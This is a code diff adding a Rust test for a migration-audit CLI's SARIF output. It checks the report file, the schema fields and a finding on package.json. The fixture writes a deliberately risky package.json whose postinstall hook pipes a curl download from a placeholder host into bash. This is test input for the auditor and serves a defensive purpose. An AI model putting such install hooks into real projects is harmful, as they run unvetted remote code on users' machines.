@@ -134,6 +134,113 @@ fn write_basic_rewrite_project(project_path: &Path) {
 }
 
 #[test]
+fn migrate_audit_sarif_out_writes_artifact_without_stdout_payload() {
+    let test_name = "migrate_audit_sarif_out_writes_artifact_without_stdout_payload";
+    let temp = TempDir::new().expect("temp dir");
+    let project_path = temp.path().join("project");
+    std::fs::create_dir_all(&project_path).expect("project dir");
+    std::fs::write(project_path.join("index.js"), "console.log('audit me');\n").expect("write js");
+    std::fs::write(
+        project_path.join("package.json"),
+        r#"{
+  "name": "demo-sarif",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/install.sh | bash"
+  }
+}
+"#,
+    )
+    .expect("write risky package manifest");
+
+    let out_path = temp.path().join("reports/migration-audit.sarif");
+    let project_arg = project_path.to_string_lossy().to_string();
+    let out_arg = out_path.to_string_lossy().to_string();
+    log_phase(
+        test_name,
+        "fixtures_written",
+        serde_json::json!({
+            "project_path": project_path.display().to_string(),
+            "sarif_path": out_path.display().to_string(),
+        }),
+    );
+
+    let output = run_cli(&[
+        "migrate",
+        "audit",
+        &project_arg,
+        "--format",
+        "sarif",
+        "--out",
+        &out_arg,
+    ]);
+    log_phase(
+        test_name,
+        "command_executed",
+        serde_json::json!({
+            "success": output.status.success(),
+            "status": output.status.code(),
+            "stdout_len": output.stdout.len(),
+            "stderr_len": output.stderr.len(),
+        }),
+    );
+    assert!(
+        output.status.success(),
+        "migrate audit --format sarif --out failed: stdout={} stderr={}",
+        String::from_utf8_lossy(&output.stdout),
+        String::from_utf8_lossy(&output.stderr)
+    );
+    assert!(
+        output.stdout.is_empty(),
+        "SARIF --out mode must not also emit a stdout payload: {}",
+        String::from_utf8_lossy(&output.stdout)
+    );
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(
+        stderr.contains("migration audit report written:"),
+        "SARIF --out mode must log the artifact path on stderr: {stderr}"
+    );
+    assert!(
+        stderr.contains(&out_arg),
+        "stderr should include the concrete SARIF path: {stderr}"
+    );
+
+    let sarif_raw = std::fs::read_to_string(&out_path).expect("SARIF report should be written");
+    let sarif: serde_json::Value = serde_json::from_str(&sarif_raw)
+        .unwrap_or_else(|err| panic!("SARIF report must be JSON: {err}\n{sarif_raw}"));
+    log_phase(
+        test_name,
+        "sarif_artifact_parsed",
+        serde_json::json!({
+            "bytes": sarif_raw.len(),
+            "result_count": sarif["runs"][0]["results"].as_array().map_or(0, Vec::len),
+        }),
+    );
+    assert_eq!(sarif["version"], serde_json::json!("2.1.0"));
+    assert_eq!(
+        sarif["$schema"],
+        serde_json::json!("https://json.schemastore.org/sarif-2.1.0.json")
+    );
+    assert_eq!(
+        sarif["runs"][0]["tool"]["driver"]["name"],
+        serde_json::json!("franken-node migrate audit")
+    );
+    let results = sarif["runs"][0]["results"]
+        .as_array()
+        .expect("SARIF results must be an array");
+    assert!(
+        results.iter().any(|result| {
+            result["ruleId"]
+                .as_str()
+                .is_some_and(|rule_id| rule_id.starts_with("mig-audit-"))
+                && result["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
+                    == serde_json::json!("package.json")
+        }),
+        "SARIF results must include the real package.json audit finding: {sarif:#?}"
+    );
+}
+
+#[test]
 fn migrate_runtime_smoke_receipt_hash_helpers_are_framed() {
     let stdout_hash = migration_runtime_smoke_stdout_sha256_hex(b"same output");
     let stderr_hash = migration_runtime_smoke_stderr_sha256_hex(b"same output");
